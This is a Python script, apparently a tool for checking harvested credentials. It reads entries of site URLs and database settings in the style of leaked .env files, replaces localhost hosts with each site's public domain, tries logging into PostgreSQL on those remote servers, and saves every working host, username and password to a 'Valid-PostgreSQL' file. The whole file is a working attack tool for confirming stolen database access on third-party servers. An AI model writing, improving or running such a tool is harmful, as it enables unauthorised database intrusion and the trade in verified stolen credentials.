import os
import psycopg2
from urllib.parse import urlparse
from datetime import datetime
from pystyle import Write, Colors, Colorate, Center
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii():
    banner = r"""
██████╗  ██████╗ ███████╗ ██████╗ ██╗     
██╔══██╗██╔════╝ ██╔════╝██╔═══██╗██║     
██████╔╝██║  ███╗███████╗██║   ██║██║     
██╔═══╝ ██║   ██║╚════██║██║▄▄ ██║██║     
██║     ╚██████╔╝███████║╚██████╔╝███████╗
╚═╝      ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝
    """
    print(Center.XCenter(Colorate.Horizontal(Colors.blue_to_cyan, banner, 1)))
    print()

def test_postgresql_connection(host, port, database, user, password):
    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            database=database,
            user=user,
            password=password,
            connect_timeout=5
        )
        conn.close()
        return True
    except Exception as e:
        return False

def process_entry(data, output_file):
    try:
        url_origin = data.get('URL')
        host = data.get('DB_HOST', data.get('HOST', '127.0.0.1'))
        port = data.get('DB_PORT', '5432')  # Default PostgreSQL port
        database = data.get('DB_DATABASE', data.get('DATABASE', data.get('DATABSE', 'postgres')))
        user = data.get('DB_USERNAME', data.get('USERNAME', data.get('DB_USER', 'postgres')))
        password = data.get('DB_PASSWORD', data.get('PASSWORD', data.get('DB_PASS', '')))

        # Replace localhost with domain if needed
        if host in ['127.0.0.1', 'localhost']:
            parsed_url = urlparse(url_origin)
            domain = parsed_url.hostname
            if domain:
                Write.Print(f"🔄 Host changed from {host} to {domain}\n", Colors.yellow_to_green, interval=0.001)
                host = domain

        Write.Print(f"\n[+] Testing: {url_origin}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"    Host: {host}:{port}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"    Database: {database}\n", Colors.blue_to_cyan, interval=0.001)
        Write.Print(f"    Username: {user}\n", Colors.blue_to_cyan, interval=0.001)

        if test_postgresql_connection(host, port, database, user, password):
            Write.Print("✅ Connection successful!\n", Colors.green_to_yellow, interval=0.001)
            
            # Save valid entry immediately
            with open(output_file, 'a') as f_out:
                f_out.write(f"URL: {url_origin}\n")
                f_out.write(f"DB_HOST: {host}\n")
                f_out.write(f"DB_PORT: {port}\n")
                f_out.write(f"DB_DATABASE: {database}\n")
                f_out.write(f"DB_USERNAME: {user}\n")
                f_out.write(f"DB_PASSWORD: {password}\n\n")
            
            return True
        else:
            Write.Print("❌ Connection failed\n", Colors.red_to_yellow, interval=0.001)
            return False

    except Exception as e:
        Write.Print(f"❌ Error processing entry: {e}\n", Colors.red_to_yellow, interval=0.001)
        return False

def main():
    clear()
    print_ascii()

    input_file = Write.Input("Enter path to your input file: ", Colors.green_to_yellow, interval=0.005)
    if not os.path.exists(input_file):
        Write.Print("❌ File not found!\n", Colors.red_to_yellow, interval=0.001)
        return

    os.makedirs("Valid-PostgreSQL", exist_ok=True)
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_file = os.path.join("Valid-PostgreSQL", f"valid_postgresql_{now}.txt")

    with open(input_file, 'r') as file:
        content = file.read()

    # Split by double newlines or by URL: prefix if entries are concatenated
    blocks = []
    current_block = []
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("URL:") and current_block:
            blocks.append("\n".join(current_block))
            current_block = []
        current_block.append(line)
    if current_block:
        blocks.append("\n".join(current_block))

    valid_count = 0

    for block in blocks:
        data = {}
        for line in block.split('\n'):
            if ':' not in line:
                continue
            key, value = line.split(':', 1)
            key = key.strip().upper()
            value = value.strip().strip('"')
            data[key] = value

        if process_entry(data, output_file):
            valid_count += 1

    Write.Print(f"\n✅ Done! Valid PostgreSQL connections saved to: {output_file}\n", Colors.green_to_yellow, interval=0.005)
    Write.Print(f"📊 Total valid: {valid_count}\n", Colors.green_to_yellow, interval=0.005)

if __name__ == "__main__":
    main()
